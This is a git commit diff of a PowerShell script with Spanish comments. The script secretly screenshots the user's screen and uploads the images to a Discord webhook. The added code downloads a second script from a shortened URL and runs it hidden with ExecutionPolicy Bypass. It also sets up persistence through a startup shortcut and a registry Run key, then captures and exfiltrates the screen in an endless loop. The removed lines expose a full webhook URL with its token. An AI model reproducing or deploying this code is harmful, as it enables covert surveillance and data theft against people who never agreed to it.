db4175cda25266c9cbbe72f83d54ecfd8072c4b1
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-09 07:35:55 -0500

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,42 +1,57 @@
-# Define la URL del webhook
-$webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
+$hookurl = "https://bit.ly/web_chupacabras"  # URL del webhook
+$scriptUrl = "https://bit.ly/Screen_dc"  # URL del script
+$seconds = 30 # Intervalo entre capturas de pantalla
+$a = 2 # Cantidad de capturas de pantalla por iteración
 
-# Define el intervalo de tiempo entre capturas de pantalla
-$intervaloCapturas = 30
-
-# Define la cantidad de capturas de pantalla a realizar
-$cantidadCapturas = 1
-
-# Función para realizar capturas de pantalla y enviar al webhook
-function CapturarYEnviar {
-    $FileTemp = "$env:TEMP\SC.png"
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-type -AssemblyName System.Drawing
-    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $Width = $Screen.Width
-    $Height = $Screen.Height
-    $Left = $Screen.Left
-    $Top = $Screen.Top
-    $Bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-    $Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)
-    $Graphic.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)
-    $Bitmap.Save($FileTemp, [System.Drawing.Imaging.ImageFormat]::Png)
-
-    # Envía la captura de pantalla al webhook
-    curl.exe -F "file1=@$FileTemp" $webhookUrl
-
-    # Elimina el archivo temporal
-    Remove-Item -Path $FileTemp
+# Función para descargar el script desde una URL
+function DescargarScript {
+    Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
 }
 
-# Función para ejecutar el ciclo de captura y envío de manera automática
-function EjecutarCiclo {
-    $counter = 0
-    while ($counter -lt $cantidadCapturas) {
-        CapturarYEnviar
-        Start-Sleep -Seconds $intervaloCapturas
-        $counter++
+# Verificar si el archivo del script existe, si no, descargarlo
+$scriptPath = "$env:temp\script.ps1"
+if (-not (Test-Path $scriptPath)) {
+    DescargarScript
+}
+
+# Crear acceso directo para ejecutar en el inicio de Windows
+$shortcutPath = "$env:temp\system1.lnk"
+$WScriptShell = New-Object -ComObject WScript.Shell
+$shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"
+$shortcut.Save()
+
+# Agregar entrada al Registro de Windows para ejecutar al iniciar sesión
+$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$scriptName = "system1"
+if (-not (Get-ItemProperty -Path $registryPath -Name $scriptName -ErrorAction SilentlyContinue)) {
+    Set-ItemProperty -Path $registryPath -Name $scriptName -Value $shortcutPath
+}
+
+# Iniciar bucle de captura y envío de imágenes
+While ($true){
+    For ($i = 0; $i -lt $a; $i++){
+        $Filett = "$env:temp\SC_$i.png"
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-type -AssemblyName System.Drawing
+        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $Width = $Screen.Width
+        $Height = $Screen.Height
+        $Left = $Screen.Left
+        $Top = $Screen.Top
+        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
     }
+    Start-Sleep 1
+    For ($i = 0; $i -lt $a; $i++){
+        curl.exe -F "file$i=@$env:temp\SC_$i.png" $hookurl
+        Start-Sleep 1
+        Remove-Item -Path "$env:temp\SC_$i.png" -Force -ErrorAction SilentlyContinue
+    }
+    Start-Sleep $seconds
 }
 
 # Ejecuta el ciclo de captura y envío de manera automática
